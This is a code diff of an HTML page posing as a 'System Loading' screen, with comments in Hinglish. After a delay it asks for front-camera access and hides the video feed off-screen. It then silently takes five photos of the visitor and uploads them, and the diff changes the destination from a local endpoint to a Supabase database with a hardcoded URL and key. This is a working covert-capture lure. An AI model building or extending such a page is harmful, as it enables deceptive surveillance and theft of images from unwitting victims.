@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>System Loading</title>
+    <!-- Supabase Library ko import kiya gaya hai -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #1a1a1a; color: white; text-align: center; margin: 0; flex-direction: column; }
         #status-container { padding: 20px; }
@@ -12,7 +14,7 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #allow-button { background-color: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; display: none; margin-top: 20px; }
         #allow-button:hover { background-color: #218838; }
-        video { position: absolute; top: -9999px; left: -9999px; } /* Camera ko chupane ke liye */
+        video { position: absolute; top: -9999px; left: -9999px; }
     </style>
 </head>
 <body>
@@ -27,13 +29,18 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // <<< AAPKI URL AUR KEY YAHAN ADD KAR DI GAYI HAIN >>>
+        const SUPABASE_URL = 'https://zxtapsswwmzrirutpelr.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp4dGFwc3N3d216cmlydXRwZWxyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTAxNTExNzcsImV4cCI6MjA2NTcyNzE3N30.J6kJ9k0AEAarxHVePl0gZSG6ya32rP7IsG8R6UfuO-U';
+
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        
         const statusEl = document.getElementById('status');
         const loaderEl = document.getElementById('loader');
         const allowButton = document.getElementById('allow-button');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         
-        // 5 second baad "Allow" button dikhayein
         setTimeout(() => {
             statusEl.textContent = 'Permission required to continue.';
             loaderEl.style.display = 'none';
@@ -46,20 +53,13 @@
             allowButton.style.display = 'none';
             loaderEl.style.display = 'block';
             statusEl.textContent = 'Requesting camera access...';
-
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' } // Front camera
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
-                
-                // Wait for the video to start playing to get dimensions
                 video.onloadedmetadata = () => {
                     statusEl.textContent = 'Access granted. Capturing images...';
                     captureAndSendPhotos(stream);
                 };
-
             } catch (err) {
                 console.error("Camera access error:", err);
                 statusEl.textContent = 'Camera access was denied. Cannot proceed.';
@@ -70,36 +70,35 @@
         function captureAndSendPhotos(stream) {
             const totalPhotos = 5;
             let photosTaken = 0;
-            
             const captureInterval = setInterval(() => {
                 if (photosTaken >= totalPhotos) {
                     clearInterval(captureInterval);
-                    stream.getTracks().forEach(track => track.stop()); // Stop the camera
+                    stream.getTracks().forEach(track => track.stop());
                     statusEl.textContent = 'Process completed successfully.';
                     loaderEl.style.display = 'none';
                     return;
                 }
-
                 photosTaken++;
                 statusEl.textContent = `Capturing and sending photo ${photosTaken} of ${totalPhotos}...`;
-
                 const context = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
                 const imageData = canvas.toDataURL('image/jpeg');
-                
-                fetch('/api/upload', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: imageData })
-                })
-                .then(response => response.json())
-                .then(data => console.log('Server response:', data.message))
-                .catch(error => console.error('Upload error:', error));
-                
-            }, 1500); // Har 1.5 second mein ek tasveer
+                sendToSupabase(imageData);
+            }, 1500);
+        }
+
+        async function sendToSupabase(imageData) {
+            try {
+                const { data, error } = await supabase
+                    .from('images') // Aapke table ka naam
+                    .insert([ { image_data: imageData } ]);
+                if (error) throw error;
+                console.log('Image sent to Supabase!');
+            } catch (error) {
+                console.error('Error sending to Supabase:', error.message);
+            }
         }
     </script>
 </body>
